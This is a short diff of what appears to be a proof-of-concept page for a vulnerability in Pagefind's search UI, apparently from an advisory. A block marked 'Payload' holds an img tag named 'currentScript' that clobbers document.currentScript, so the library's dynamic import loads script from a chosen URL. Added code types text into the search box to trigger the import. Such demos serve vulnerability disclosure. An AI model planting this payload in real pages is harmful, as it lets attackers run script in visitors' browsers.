@@ -36,12 +36,17 @@ g = await import(`${r}pagefind.js`)
 <script>
     window.addEventListener('DOMContentLoaded', (event) => {
         new PagefindUI({ element: "#search", showSubResults: true });
+        const inputElement = document.querySelector('.pagefind-ui__search-input.svelte-e9gkc3');
+        if (inputElement) {
+            inputElement.value = 'Your text here';
+            inputElement.dispatchEvent(new Event('input'));
+        }
     });
 </script>
 <!--Library-->
 
 <!--Payload-->
-<img name="currentScript" src="blob:http://localhost:9999/ui.js"></img>
+<img name="currentScript" src="blob:http://localhost:9999/ui.js">
 <!--Payload-->
 ```
 
